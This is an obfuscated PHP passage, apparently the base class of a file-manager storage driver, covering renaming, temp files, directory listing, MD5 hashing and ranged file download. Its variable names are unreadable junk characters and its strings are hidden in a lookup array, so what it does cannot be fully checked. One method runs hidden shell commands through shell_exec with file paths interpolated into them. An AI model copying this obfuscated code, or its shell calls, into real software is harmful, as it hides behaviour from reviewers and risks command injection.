$¾ÂÏ„Êû = '') { } public function renameObject($……ç§Ö›, $æËğ€Ğü) { $ëù¯ÄÅİ = $æËğ€Ğü; $……ç§Ö› = $this->getPathOuter($……ç§Ö›); $æËğ€Ğü = $this->pathFather($……ç§Ö›) . $æËğ€Ğü; $¤¢î¾Åë = IO::copy($……ç§Ö›, $this->pathFather($……ç§Ö›), REPEAT_RENAME_FOLDER, $ëù¯ÄÅİ); if ($¤¢î¾Åë) { IO::remove($……ç§Ö›); } return $¤¢î¾Åë ? $æËğ€Ğü : !1; } public function tempFile($±’¬ß¿Ù = '', $ÁÍÖÊ—Â = '') { if (!$±’¬ß¿Ù) { $±’¬ß¿Ù = rand_string(15); } $Ã§€™¤‰ = TEMP_FILES . rand_string(15) . $_SERVER[ˆö¿ÚÌ¼][8]; @mkdir($Ã§€™¤‰, DEFAULT_PERRMISSIONS, !0); $¤úÌƒğ² = $Ã§€™¤‰ . $±’¬ß¿Ù; @touch($¤úÌƒğ²); if ($ÁÍÖÊ—Â) { file_put_contents($¤úÌƒğ², $ÁÍÖÊ—Â); } return $¤úÌƒğ²; } public function tempFileRemve($‹œâÍæ) { @unlink($‹œâÍæ); @rmdir($this->pathFather($‹œâÍæ)); } public function mkfile($¼ğ¯­Ô·, $›á˜¤Œü = '', $ˆè½Óİ¸ = REPEAT_RENAME) { } public function mkdir($„²â—”ñ, $ï®¢Ûäç = REPEAT_SKIP) { } public function delFile($ƒŸ¹öóÕ) { } public function delFolder($ÛŠŞ¦ú) { } public function copyFile($Š„­ÑšÙ, $æü™¦À) { } public function moveFile($ªˆ¬ûŞ×, $í–Óöö¿) { } public function remove($‹‘íÚĞ) { if ($this->isFile($‹‘íÚĞ)) { return $this->delFile($‹‘íÚĞ); } return $this->delFolder($‹‘íÚĞ); } public function rename($Š«Áö÷, $ôœ·ÀÄÏ) { } public function exist($æ¾ò°“) { } public function findByHash($¼±ò•² = '', $Ù˜Ñ·‚İ = '') { return !1; } public function isFile($•±Àƒ“) { } public function isFolder($ÌåÙËÉ) { } public function size($ƒö÷¸äÊ) { } public function info($¾Ä€Ôì) { } public function infoSimple($—£æàœ›) { return $this->info($—£æàœ›); } public function infoAuth($×Ã£¿û) { return $this->info($×Ã£¿û); } public function infoFull($¨—Ò¦Ç¨) { return $this->info($¨—Ò¦Ç¨); } public function infoFullSimple($Ñ¯€»“Ì) { return $this->info($Ñ¯€»“Ì); } public function infoWithChildren($”¶Ñûš) { $à”‡Ş½‚ =& $_SERVER[ˆö¿ÚÌ¼]; static $ÛäÎÄù = array(); if (isset($ÛäÎÄù[$”¶Ñûš])) { return $ÛäÎÄù[$”¶Ñûš]; } $Óµ½¾°Ë = $this->info($”¶Ñûš); if ($Óµ½¾°Ë && $Óµ½¾°Ë[$à”‡Ş½‚[33]] == $à”‡Ş½‚[78]) { $üôâ÷Ô“ = array($à”‡Ş½‚[79] => 0, $à”‡Ş½‚[80] => 0, $à”‡Ş½‚[81] => 0); $this->infoChildren($”¶Ñûš, $üôâ÷Ô“); $Óµ½¾°Ë[$à”‡Ş½‚[79]] = $üôâ÷Ô“[$à”‡Ş½‚[79]]; $Óµ½¾°Ë[$à”‡Ş½‚[82]] = array($à”‡Ş½‚[83] => $üôâ÷Ô“[$à”‡Ş½‚[80]], $à”‡Ş½‚[84] => $üôâ÷Ô“[$à”‡Ş½‚[81]]); $ÛäÎÄù[$”¶Ñûš] = $Óµ½¾°Ë; } return $Óµ½¾°Ë; } public function listPath($²š“ºŞª, $éÆñô§ = false) { } public function has($æ¯ÈÛ¸Ÿ, $àßÜú€ = false, $ä¢–‹ö‰ = false) { } public function canRead($÷½Ï»¥­) { } public function canWrite($¬ÂÇÄİô) { } public function getContent($ÌÕÄ¾) { } public function setContent($Û¶ÍÚ„û, $¯óÏäè = '') { } protected function infoChildren($ëŞÆ€ë, &$“„Èˆ˜°) { $—Ì®‹Ù¼ =& $_SERVER[ˆö¿ÚÌ¼]; check_abort_echo(); $òŒñË¹ğ = $this->listPath($ëŞÆ€ë, !0); $òŒñË¹ğ = array_merge($òŒñË¹ğ[$—Ì®‹Ù¼[85]], $òŒñË¹ğ[$—Ì®‹Ù¼[86]]); foreach ($òŒñË¹ğ as $˜¬‘àŸ¾) { if ($˜¬‘àŸ¾[$—Ì®‹Ù¼[33]] == $—Ì®‹Ù¼[78]) { $“„Èˆ˜°[$—Ì®‹Ù¼[81]]++; $“íÂóÊ¨ = $this->getPathInner($˜¬‘àŸ¾[$—Ì®‹Ù¼[87]]); $this->infoChildren($“íÂóÊ¨, $“„Èˆ˜°); } else { $“„Èˆ˜°[$—Ì®‹Ù¼[80]]++; $“„Èˆ˜°[$—Ì®‹Ù¼[79]] += $˜¬‘àŸ¾[$—Ì®‹Ù¼[79]]; } } } public function fileSubstr($ŞÀ¯¨Á, $˜Æ³—˜ù, $ì‚ÊØŒÛ) { } public function listAll($ú…•Şñ) { } public function listAllMake($˜­à×‚, &$­Ûîİç¹) { $ïÃì±·Å =& $_SERVER[ˆö¿ÚÌ¼]; check_abort_echo(); $­ŸÕ½³ú = $this->listPath($˜­à×‚, !0); if (!$­ŸÕ½³ú) { return; } $ÑÃ‚ğ¦ = array_merge($­ŸÕ½³ú[$ïÃì±·Å[85]], $­ŸÕ½³ú[$ïÃì±·Å[86]]); foreach ($ÑÃ‚ğ¦ as $Š½¼éİ×) { $Éó‡´µõ = $Š½¼éİ×[$ïÃì±·Å[33]] == $ïÃì±·Å[78]; $¯š©«¤Ü = array($ïÃì±·Å[87] => $Š½¼éİ×[$ïÃì±·Å[87]], $ïÃì±·Å[78] => $Éó‡´µõ); if (isset($Š½¼éİ×[$ïÃì±·Å[79]])) { $¯š©«¤Ü[$ïÃì±·Å[79]] = $Š½¼éİ×[$ïÃì±·Å[79]]; } if (isset($Š½¼éİ×[$ïÃì±·Å[88]])) { $¯š©«¤Ü[$ïÃì±·Å[88]] = $Š½¼éİ×[$ïÃì±·Å[88]]; } if (!$Éó‡´µõ) { $­Ûîİç¹[] = $¯š©«¤Ü; continue; } $­Ûîİç¹[] = $¯š©«¤Ü; $¢×Ä”ƒ = $Š½¼éİ×[$ïÃì±·Å[87]]; $­È÷•î = $this->pathDriver; if (substr($Š½¼éİ×[$ïÃì±·Å[87]], 0, strlen($­È÷•î)) == $­È÷•î) { $¢×Ä”ƒ = substr($¢×Ä”ƒ, strlen($­È÷•î)); } $this->listAllMake($¢×Ä”ƒ, $­Ûîİç¹); } } public function listAllSimple($°íğ¨Í£, $™®¿Âé = false) { $ã²¼ÇŒ  = $this->listAll($°íğ¨Í£); return $this->listAllSimpleMake($ã²¼ÇŒ , $this->getPathOuter($°íğ¨Í£), $™®¿Âé); } public function listAllSimpleMake($äê¨”Æ², $¹¼ŒĞáí, $ÆöÚµÉ) { $Å€Ï–’Ğ =& $_SERVER[ˆö¿ÚÌ¼]; $¡äÌÉÚ¦ = array(); $¹¼ŒĞáí = rtrim(get_path_father($¹¼ŒĞáí), $Å€Ï–’Ğ[8]) . $Å€Ï–’Ğ[8]; foreach ($äê¨”Æ² as $óÆ¢öÖ¥) { $É¸‚ï¹» = array($Å€Ï–’Ğ[87] => $óÆ¢öÖ¥[$Å€Ï–’Ğ[87]], $Å€Ï–’Ğ[89] => $óÆ¢öÖ¥[$Å€Ï–’Ğ[87]], $Å€Ï–’Ğ[78] => $óÆ¢öÖ¥[$Å€Ï–’Ğ[78]]); if (isset($óÆ¢öÖ¥[$Å€Ï–’Ğ[79]]) && !$óÆ¢öÖ¥[$Å€Ï–’Ğ[78]]) { $É¸‚ï¹»[$Å€Ï–’Ğ[79]] = $óÆ¢öÖ¥[$Å€Ï–’Ğ[79]]; } if (isset($óÆ¢öÖ¥[$Å€Ï–’Ğ[88]])) { $É¸‚ï¹»[$Å€Ï–’Ğ[88]] = $óÆ¢öÖ¥[$Å€Ï–’Ğ[88]]; } if (is_array($óÆ¢öÖ¥[$Å€Ï–’Ğ[90]])) { $É¸‚ï¹»[$Å€Ï–’Ğ[89]] = $óÆ¢öÖ¥[$Å€Ï–’Ğ[90]][$Å€Ï–’Ğ[87]]; $É¸‚ï¹»[$Å€Ï–’Ğ[79]] = $óÆ¢öÖ¥[$Å€Ï–’Ğ[90]][$Å€Ï–’Ğ[79]]; $É¸‚ï¹»[$Å€Ï–’Ğ[88]] = $óÆ¢öÖ¥[$Å€Ï–’Ğ[90]][$Å€Ï–’Ğ[88]]; } else { if (substr($óÆ¢öÖ¥[$Å€Ï–’Ğ[87]], 0, strlen($¹¼ŒĞáí)) == $¹¼ŒĞáí) { $É¸‚ï¹»[$Å€Ï–’Ğ[87]] = substr($óÆ¢öÖ¥[$Å€Ï–’Ğ[87]], strlen($¹¼ŒĞáí)); } } $¹çÚóè = $óÆ¢öÖ¥[$Å€Ï–’Ğ[78]] ? $Å€Ï–’Ğ[8] : $Å€Ï–’Ğ[12]; $É¸‚ï¹»[$Å€Ï–’Ğ[89]] = rtrim($É¸‚ï¹»[$Å€Ï–’Ğ[89]], $Å€Ï–’Ğ[8]) . $¹çÚóè; $É¸‚ï¹»[$Å€Ï–’Ğ[87]] = $Å€Ï–’Ğ[8] . trim($É¸‚ï¹»[$Å€Ï–’Ğ[87]], $Å€Ï–’Ğ[8]) . $¹çÚóè; if (!$ÆöÚµÉ) { $¨¦ºå¬ü = explode($Å€Ï–’Ğ[8], trim($É¸‚ï¹»[$Å€Ï–’Ğ[87]], $Å€Ï–’Ğ[8])); $É¸‚ï¹»[$Å€Ï–’Ğ[87]] = $Å€Ï–’Ğ[8] . implode($Å€Ï–’Ğ[8], array_slice($¨¦ºå¬ü, 1)) . $¹çÚóè; } $¡äÌÉÚ¦[] = $É¸‚ï¹»; } return array_sort_by($¡äÌÉÚ¦, $Å€Ï–’Ğ[87]); } public function upload($É™æ¥ãğ, $¥Á¯éÁ¥, $ÌÆ·ÚÍ¤ = false, $øú†¿ßß = REPEAT_REPLACE) { } public function uploadFileByID($¹¤äê© , $àøñ³£, $‘­ÒÚÜØ) { } public function uploadFileByPath($ª›À­îê, $üá×ÑÌ¥, $ıóĞÒ×ù = array()) { } public function isUploadServer() { $ÊşĞœ‰à =& $_SERVER[ˆö¿ÚÌ¼]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $ÊşĞœ‰à[91]) { return !0; } return $GLOBALS[$ÊşĞœ‰à[6]][$ÊşĞœ‰à[92]][$ÊşĞœ‰à[93]]; } public function isFileOutServer() { $è»ü—Ş¡ =& $_SERVER[ˆö¿ÚÌ¼]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $è»ü—Ş¡[91]) { return !0; } return $GLOBALS[$è»ü—Ş¡[6]][$è»ü—Ş¡[92]][$è»ü—Ş¡[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($§‚õ—†) { $¸´–Äˆ =& $_SERVER[ˆö¿ÚÌ¼]; if (!$this->isCdnHost()) { return $§‚õ—†; } return str_replace(trim(get_url_root($§‚õ—†), $¸´–Äˆ[8]), trim($this->cdnHost, $¸´–Äˆ[8]), $§‚õ—†); } public function uploadLink($¨ãí§Ÿ, $ıÜüïšë = 0) { $§×ç­â½ =& $_SERVER[ˆö¿ÚÌ¼]; if ($this->isUploadServer()) { return; } $ºËá°Å¾ = $this->getType(); if (!in_array($ºËá°Å¾, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $§é–óî´ = 1024 * 1024 * 10; $Äî¸¿¿ = $ıÜüïšë <= $§é–óî´ ? $§×ç­â½[95] : $§×ç­â½[96]; $âŒ¶ıÎ¿ = (!$ıÜüïšë ? 1 : ceil($ıÜüïšë / pow(1024, 3))) * 3600 * 4; $¡ùµüä = $this->{$Äî¸¿¿}($¨ãí§Ÿ, $âŒ¶ıÎ¿); if ($¡ùµüä) { $¡ùµüä[$§×ç­â½[97]] = $¨ãí§Ÿ; $¡ùµüä[$§×ç­â½[98]] = $ºËá°Å¾; } return $¡ùµüä; } public function uploadFormData($î¡¦ƒÅè, $œ°õ€ = 3600) { } public function uploadMultiData($£¾é¥‘É, $²üäŒØ = 3600) { } public function multiUploadFormData($÷íÏ®œÀ, $„¨û¶ = 3600) { return $this->uploadMultiData($÷íÏ®œÀ, $„¨û¶); } public function download($û¡ÓŸ, $¥·ß×¨¤) { } public function ext($¦ÀæÔª„) { $°ß‹¨ª¯ =& $_SERVER[ˆö¿ÚÌ¼]; if (strpos($¦ÀæÔª„, $°ß‹¨ª¯[8]) === -1) { $Óäùò¶è = $¦ÀæÔª„; } else { $Óäùò¶è = $this->pathThis($¦ÀæÔª„); } $îÇ†¼’¾ = $°ß‹¨ª¯[12]; if (strstr($Óäùò¶è, $°ß‹¨ª¯[10])) { $îÇ†¼’¾ = substr($Óäùò¶è, strrpos($Óäùò¶è, $°ß‹¨ª¯[10]) + 1); $îÇ†¼’¾ = strtolower($îÇ†¼’¾); } if (strlen($îÇ†¼’¾) > 3 && preg_match($°ß‹¨ª¯[99], $îÇ†¼’¾, $½ˆÄá¯)) { $îÇ†¼’¾ = $°ß‹¨ª¯[12]; } return $îÇ†¼’¾; } public function pathThis($¾™äœà¥) { $Â¡©îüÛ =& $_SERVER[ˆö¿ÚÌ¼]; $¾™äœà¥ = str_replace($Â¡©îüÛ[100], $Â¡©îüÛ[8], rtrim($¾™äœà¥, $Â¡©îüÛ[8])); $…Ù×Ÿü© = strrpos($¾™äœà¥, $Â¡©îüÛ[8]); if ($…Ù×Ÿü© === !1) { return $¾™äœà¥; } return substr($¾™äœà¥, $…Ù×Ÿü© + 1); } public function pathFather($ğàëˆê) { $·µŸ¡Ëà =& $_SERVER[ˆö¿ÚÌ¼]; $ğàëˆê = str_replace($·µŸ¡Ëà[100], $·µŸ¡Ëà[8], rtrim($ğàëˆê, $·µŸ¡Ëà[8])); $Úü ï› = strrpos($ğàëˆê, $·µŸ¡Ëà[8]); if ($Úü ï› === !1) { return $·µŸ¡Ëà[12]; } return substr($ğàëˆê, 0, $Úü ï› + 1); } public function hashSimple($Åìæ´Â) { $«·¸±Ùº =& $_SERVER[ˆö¿ÚÌ¼]; if (!$Åìæ´Â) { return md5($«·¸±Ùº[12]); } $—¯„‡ = $this->size($Åìæ´Â); $Ë¹òÄ˜ª = 200; $ïá›¸‡ş = 50; if ($—¯„‡ <= $Ë¹òÄ˜ª * $ïá›¸‡ş) { return $this->hashMd5($Åìæ´Â) . $—¯„‡; } $¬•¨ñ¼ú = intval($—¯„‡ / $ïá›¸‡ş); $©¨©ıÃ = $«·¸±Ùº[12]; for ($É¶¦‚„ß = 0; $É¶¦‚„ß < $ïá›¸‡ş; $É¶¦‚„ß++) { $©¨©ıÃ .= $this->fileSubstr($Åìæ´Â, $¬•¨ñ¼ú * $É¶¦‚„ß, $Ë¹òÄ˜ª); } $©¨©ıÃ .= $this->fileSubstr($Åìæ´Â, $—¯„‡ - $Ë¹òÄ˜ª, $Ë¹òÄ˜ª); return md5($©¨©ıÃ) . $—¯„‡; } public static $md5Cache = array(); public function hashMd5($˜ÖÔ“¢‘) { if (!$˜ÖÔ“¢‘) { return md5($_SERVER[ˆö¿ÚÌ¼][12]); } $˜ÖÔ“¢‘ = $this->iconvSystem($˜ÖÔ“¢‘); if (isset(self::$md5Cache[$˜ÖÔ“¢‘])) { return self::$md5Cache[$˜ÖÔ“¢‘]; } self::$md5Cache[$˜ÖÔ“¢‘] = $this->hashMd5Shell($˜ÖÔ“¢‘); if (!self::$md5Cache[$˜ÖÔ“¢‘]) { self::$md5Cache[$˜ÖÔ“¢‘] = @md5_file($˜ÖÔ“¢‘); } return self::$md5Cache[$˜ÖÔ“¢‘]; } private function hashMd5Shell($ÓÂÉÜÎ) { $ÇÇÃ ŸŞ =& $_SERVER[ˆö¿ÚÌ¼]; if (!$ÓÂÉÜÎ) { return md5($ÇÇÃ ŸŞ[12]); } if (!function_exists($ÇÇÃ ŸŞ[101])) { return !1; } $Œäµ†¿ì = array($ÇÇÃ ŸŞ[102], $ÇÇÃ ŸŞ[103]); $Ø£¥²Â¹ = Cache::get($ÇÇÃ ŸŞ[104]); if (!$Ø£¥²Â¹) { $Êö¥•¸× = BASIC_PATH . $ÇÇÃ ŸŞ[105]; $·±ÌÀ† = md5_file($Êö¥•¸×); $Ø£¥²Â¹ = $ÇÇÃ ŸŞ[106]; foreach ($Œäµ†¿ì as $Ÿ¹®ï®Á) { $¹âƒÇ‘ = shell_exec($Ÿ¹®ï®Á . "\40\x22{$Êö¥•¸×}\42"); if ($¹âƒÇ‘ && substr(trim($¹âƒÇ‘), 0, 32) == $·±ÌÀ†) { $Ø£¥²Â¹ = $Ÿ¹®ï®Á; break; } } Cache::set($ÇÇÃ ŸŞ[104], $Ø£¥²Â¹, 3600); } if ($Ø£¥²Â¹ == $ÇÇÃ ŸŞ[106]) { return !1; } $¹âƒÇ‘ = shell_exec($Ø£¥²Â¹ . "\40\x22{$ÓÂÉÜÎ}\42"); $¹âƒÇ‘ = str_replace($ÇÇÃ ŸŞ[107], $ÇÇÃ ŸŞ[12], $¹âƒÇ‘); return substr($¹âƒÇ‘, 0, 32); } public function link($¨ˆàšÔ) { return $¨ˆàšÔ; } public function fileOut($ÜøÅÏ´ı, $ò¨èêé = false, $±İªÈì­ = false, $Úş‚÷€É = '') { $ñ¯î”ÒÏ =& $_SERVER[ˆö¿ÚÌ¼]; $this->cacheMethod(null, null); if (!$ÜøÅÏ´ı || !$this->exist($ÜøÅÏ´ı)) { show_json(LNG($ñ¯î”ÒÏ[108]), !1, $±İªÈì­); } $Àáœ†¾ = $this->getType() == $ñ¯î”ÒÏ[109]; $øñá„‡Š = $GLOBALS[$ñ¯î”ÒÏ[6]][$ñ¯î”ÒÏ[92]][$ñ¯î”ÒÏ[110]][$ñ¯î”ÒÏ[111]]; $…ÎŠóá = (double) $GLOBALS[$ñ¯î”ÒÏ[6]][$ñ¯î”ÒÏ[92]][$ñ¯î”ÒÏ[110]][$ñ¯î”ÒÏ[112]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $Ÿ‘‰ äÊ = $this->infoFull($ÜøÅÏ´ı); $–Ú›«ˆ¹ = $Ÿ‘‰ äÊ[$ñ¯î”ÒÏ[79]]; $µÙüî¨É = gmdate($ñ¯î”ÒÏ[113], $Ÿ‘‰ äÊ[$ñ¯î”ÒÏ[88]]); $‡õ³õ© = $±İªÈì­ ? $±İªÈì­ : $this->iconvApp($Ÿ‘‰ äÊ[$ñ¯î”ÒÏ[32]]); $¹êÅ¾Í˜ = 0; $Ï¤¤­“° = $–Ú›«ˆ¹ - 1; $‡ç¬®„ë = $this->ext($‡õ³õ©); if (in_array($‡ç¬®„ë, array($ñ¯î”ÒÏ[114], $ñ¯î”ÒÏ[115], $ñ¯î”ÒÏ[116], $ñ¯î”ÒÏ[117]))) { $‡ç¬®„ë = $ñ¯î”ÒÏ[118]; } if (in_array($‡ç¬®„ë, array($ñ¯î”ÒÏ[119]))) { $‡ç¬®„ë = $ñ¯î”ÒÏ[120]; } if (!$Úş‚÷€É) { $Úş‚÷€É = md5($µÙüî¨É . $–Ú›«ˆ¹); } $Úş‚÷€É = $ñ¯î”ÒÏ[121] . $Úş‚÷€É . $ñ¯î”ÒÏ[121]; $ğÈË¥®ª = get_file_mime($‡ç¬®„ë); $””•ŠåÃ = !0; $””•ŠåÃ = isset($_GET[$ñ¯î”ÒÏ[122]]) ? !1 : !0; if ($ò¨èêé === !1 && !mime_support($ğÈË¥®ª)) { $ğÈË¥®ª = $ñ¯î”ÒÏ[123]; } header($ñ¯î”ÒÏ[124]); header($ñ¯î”ÒÏ[125] . $ğÈË¥®ª); $•”Æ†È„ = rawurlencode($‡õ³õ©); $•”Æ†È„ = $ñ¯î”ÒÏ[121] . $•”Æ†È„ . $ñ¯î”ÒÏ[126] . $•”Æ†È„; if ($ò¨èêé) { header($ñ¯î”ÒÏ[127]); header($ñ¯î”ÒÏ[128] . $•”Æ†È„); } else { if ($””•ŠåÃ) { header($ñ¯î”ÒÏ[129] . $•”Æ†È„); } } $Şİëáœà = 3600 * 24 * 30; header($ñ¯î”ÒÏ[130]); header($ñ¯î”ÒÏ[131]); header($ñ¯î”ÒÏ[132] . $Şİëáœà); header($ñ¯î”ÒÏ[133] . gmdate($ñ¯î”ÒÏ[113], time() + $Şİëáœà) . $ñ¯î”ÒÏ[134]); if (isset($_SERVER[$ñ¯î”ÒÏ[135]]) && strtotime($_SERVER[$ñ¯î”ÒÏ[135]]) == $Ÿ‘‰ äÊ[$ñ¯î”ÒÏ[88]]) { header($ñ¯î”ÒÏ[136], !0, 304); die; } if (isset($_SERVER[$ñ¯î”ÒÏ[137]]) && $_SERVER[$ñ¯î”ÒÏ[137]] == $Úş‚÷€É) { header($ñ¯î”ÒÏ[138] . $Úş‚÷€É, !0, 304); die; } header($ñ¯î”ÒÏ[138] . $Úş‚÷€É); header($ñ¯î”ÒÏ[139] . $µÙüî¨É . $ñ¯î”ÒÏ[134]); header($ñ¯î”ÒÏ[140] . $‡õ³õ©); header($ñ¯î”ÒÏ[141]); header($ñ¯î”ÒÏ[142] . $–Ú›«ˆ¹); header($ñ¯î”ÒÏ[143]); Hook::trigger($ñ¯î”ÒÏ[144], $ÜøÅÏ´ı, $–Ú›«ˆ¹, $‡õ³õ©, $‡ç¬®„ë); if (!$ò¨èêé && $‡ç¬®„ë == $ñ¯î”ÒÏ[145]) { if ($–Ú›«ˆ¹ > 1024 * 1024 * 5) { die; } $†›ü§õğ = $this->getContent($ÜøÅÏ´ı); $†›ü§õğ = Html::clearSVG($†›ü§õğ); header($ñ¯î”ÒÏ[146] . strlen($†›ü§õğ)); echo $†›ü§õğ; die; } $Ş‘á¤ = strtolower($_SERVER[$ñ¯î”ÒÏ[147]]); if ($Àáœ†¾ && $Ş‘á¤ && $øñá„‡Š) { if (strstr($Ş‘á¤, $ñ¯î”ÒÏ[148])) { header($ñ¯î”ÒÏ[149] . $ÜøÅÏ´ı); } else { if (strstr($Ş‘á¤, $ñ¯î”ÒÏ[150])) { header($ñ¯î”ÒÏ[151] . $ÜøÅÏ´ı); } else { if (strstr($Ş‘á¤, $ñ¯î”ÒÏ[152])) { header($ñ¯î”ÒÏ[153] . $ÜøÅÏ´ı); } } } if ($…ÎŠóá) { header($ñ¯î”ÒÏ[154] . $…ÎŠóá); } return; } if (isset($_SERVER[$ñ¯î”ÒÏ[155]])) { if (preg_match($ñ¯î”ÒÏ[156], $_SERVER[$ñ¯î”ÒÏ[155]], $î²Ù§ìÄ)) { $¹êÅ¾Í˜ = intval($î²Ù§ìÄ[1]); $¹êÅ¾Í˜ = $¹êÅ¾Í˜ <= 0 ? 0 : ($¹êÅ¾Í˜ >= $Ï¤¤­“° ? $Ï¤¤­“° : $¹êÅ¾Í˜); if (!empty($î²Ù§ìÄ[2])) { $éÓÍ½ÓÍ = intval($î²Ù§ìÄ[2]); $Ï¤¤­“° = $éÓÍ½ÓÍ < $¹êÅ¾Í˜ ? $¹êÅ¾Í˜ : ($éÓÍ½ÓÍ >= $Ï¤¤­“° ? $Ï¤¤­“° : $éÓÍ½ÓÍ); } } header($ñ¯î”ÒÏ[157]); header("\103\x6f\156\x74\145\156\164\x2d\x52\141\x6e\147\145\72\40\142\171\164\145\x73\40{$¹êÅ¾Í˜}\55{$Ï¤¤­“°}\57" . $–Ú›«ˆ¹); } else { header($ñ¯î”ÒÏ[158]); } header($ñ¯î”ÒÏ[159]); header($ñ¯î”ÒÏ[160]); $Üª‘İ•€ = !0; if ($_SERVER[$ñ¯î”ÒÏ[161]] == $ñ¯î”ÒÏ[162] && $–Ú›«ˆ¹ > 1204 * 1024 * 1024 * 2) { $Üª‘İ•€ = !1; } if ($Üª‘İ•€) { header($ñ¯î”ÒÏ[163] . ($Ï¤¤­“° - $¹êÅ¾Í˜ + 1)); } if ($_SERVER[$ñ¯î”ÒÏ[164]] == $ñ¯î”ÒÏ[165]) { return; } $ê¡ÜèÛ§ = array($ñ¯î”ÒÏ[166] => !1, $ñ¯î”ÒÏ[167] => $¹êÅ¾Í˜, $ñ¯î”ÒÏ[168] => $Ï¤¤­“°, $ñ¯î”ÒÏ[169] => $‡ç¬®„ë, $ñ¯î”ÒÏ[170] => $Ÿ‘‰ äÊ, $ñ¯î”ÒÏ[171] => $ñ¯î”ÒÏ[12], $ñ¯î”ÒÏ[172] => 0); $ê¡ÜèÛ§ = Hook::filter($ñ¯î”ÒÏ[173], $ê¡ÜèÛ§); $ëÍşÕÓš = 1024 * 300; $ÄÂŠÇí¨ = 0; if ($…ÎŠóá) { $ÄÂŠÇí¨ = intval(1000 * 1000 * ($ëÍşÕÓš / $…ÎŠóá)); } while ($¹êÅ¾Í˜ <= $Ï¤¤­“°) { $–Ö¸„Îå = timeFloat(); check_abort(); $‹ÖøŒ®È = $Ï¤¤­“° - $¹êÅ¾Í˜ + 1; if ($‹ÖøŒ®È <= $ëÍşÕÓš) { $ëÍşÕÓš = $‹ÖøŒ®È; } $†›ü§õğ = $this->fileSubstr($ÜøÅÏ´ı, $¹êÅ¾Í˜, $ëÍşÕÓš); if ($ê¡ÜèÛ§[$ñ¯î”ÒÏ[166]]) { $ê¡ÜèÛ§[$ñ¯î”ÒÏ[171]] = $†›ü§õğ; $ê¡ÜèÛ§[$ñ¯î”ÒÏ[172]] = $¹êÅ¾Í˜; $ê¡ÜèÛ§ = Hook::filter($ñ¯î”ÒÏ[174], $ê¡ÜèÛ§); $†›ü§õğ = $ê¡ÜèÛ§[$ñ¯î”ÒÏ[171]]; } echo $†›ü§õğ; $¹êÅ¾Í˜ += $ëÍşÕÓš; if ($ëÍşÕÓš == $‹ÖøŒ®È) { $¹êÅ¾Í˜ = $Ï¤¤­“° + 1; } if ($ÄÂŠÇí¨) { $²†ÛõµÍ = intval(1000 * 1000 * (timeFloat() - $–Ö¸„Îå)); $¦ÉÏôíß = $ÄÂŠÇí¨ - $²†ÛõµÍ; if ($¦ÉÏôíß > 5) { usleep($¦ÉÏôíß); } } } } public function fileOutServer($³ÔÛ™×, $“ş½şö = false, $À’Ó“õ‘ = false, $¯µÊöÂ¶ = '') { $this->fileOut($³ÔÛ™×, $“ş½şö, $À’Ó“õ‘, $¯µÊöÂ¶); } public function fileOutLink($›ñ©†Ê¶) { header($_SERVER[ˆö¿ÚÌ¼][175] . $›ñ©†Ê¶); die; } public function cacheMethod($Ñğğæ, $øşü™±ü, $ÕæÜÉ¹Õ = null) { $æéµ×Ü‘ =& $_SERVER[ˆö¿ÚÌ¼]; static $µÁ¥ü’² = array(); $ÆÌ‹ë† = $øşü™±ü ? ltrim($this->getPathOuter($øşü™±ü), $æéµ×Ü‘[8]) : $æéµ×Ü‘[12]; $È¬î³ìª = $æéµ×Ü‘[176] . $Ñğğæ . $æéµ×Ü‘[177] . rtrim($ÆÌ‹ë†, $æéµ×Ü‘[8]); if (is_null($Ñğğæ)) { $µÁ¥ü’² = array(); return; } if (is_null($øşü™±ü)) { foreach ($µÁ¥ü’² as $È¬î³ìª => $Ÿ£éâË) { if (!strstr($È¬î³ìª, $æéµ×Ü‘[176] . $Ñğğæ . $æéµ×Ü‘[178])) { continue; } unset($µÁ¥ü’²[$È¬î³ìª]); } return; } if ($ÕæÜÉ¹Õ === $æéµ×Ü‘[179]) { unset($µÁ¥ü’²[$È¬î³ìª]); return; } if (!is_null($ÕæÜÉ¹Õ)) { $µÁ¥ü’²[$È¬î³ìª] = $ÕæÜÉ¹Õ; return; } $Æ¬†øÊØ = isset($µÁ¥ü’²[$È¬î³ìª]) ? $µÁ¥ü’²[$È¬î³ìª] : null; if (!is_null($Æ¬†øÊØ)) { return $Æ¬†øÊØ; } $Æ¬†øÊØ = $this->{$Ñğğæ}($øşü™±ü); $µÁ¥ü’²[$È¬î³ìª] = $Æ¬†øÊØ; return $Æ¬†øÊØ; } public function cacheMethodInfoSet($×˜ÏËĞô, $à½ŞÂ£Ş, $î±ÏŠ»õ = false) { $áåºÃŸ§ =& $_SERVER[ˆö¿ÚÌ¼]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($áåºÃŸ§[180], $×˜ÏËĞô, $à½ŞÂ£Ş); $this->cacheMethod($áåºÃŸ§[181], $×˜ÏËĞô, $à½ŞÂ£Ş ? !1 : !0); if (is_array($î±ÏŠ»õ)) { $this->cacheMethod($áåºÃŸ§[182], $×˜ÏËĞô, $î±ÏŠ»õ); } } public function fileOutImage($Ñ¹Á¾™ô, $ŞÓ¤ø”£ = 250) { $ñÏáÜş÷ =& $_SERVER[ˆö¿ÚÌ¼]; set_timeout(); if (substr($Ñ¹Á¾™ô, 0, 4) == $ñÏáÜş÷[152]) { $this->fileOutLink($Ñ¹Á¾™ô); } $ĞùÍ¶Îî = $this->info($Ñ¹Á¾™ô); $ë£¸ªÒ» = !1; $¡ğÛ®ğ¿ = isset($GLOBALS[$ñÏáÜş÷[183]]) ? $GLOBALS[$ñÏáÜş÷[183]] : array(); if ($¡ğÛ®ğ¿ && $¡ğÛ®ğ¿[$ñÏáÜş÷[184]] == $ĞùÍ¶Îî[$ñÏáÜş÷[87]]) { $ĞùÍ¶Îî = $¡ğÛ®ğ¿; $Ï¬Â¾‹¼ = $ĞùÍ¶Îî[$ñÏáÜş÷[185]]; if ($Ï¬Â¾‹¼ && isset($Ï¬Â¾‹¼[$ñÏáÜş÷[186]])) { if ($Ï¬Â¾‹¼[$ñÏáÜş÷[186]] <= $ŞÓ¤ø”£ && $Ï¬Â¾‹¼[$ñÏáÜş÷[187]] <= $ŞÓ¤ø”£) { $ë£¸ªÒ» = !0; } } } if ($ĞùÍ¶Îî[$ñÏáÜş÷[79]] <= 1024 * 50 || $ë£¸ªÒ» || 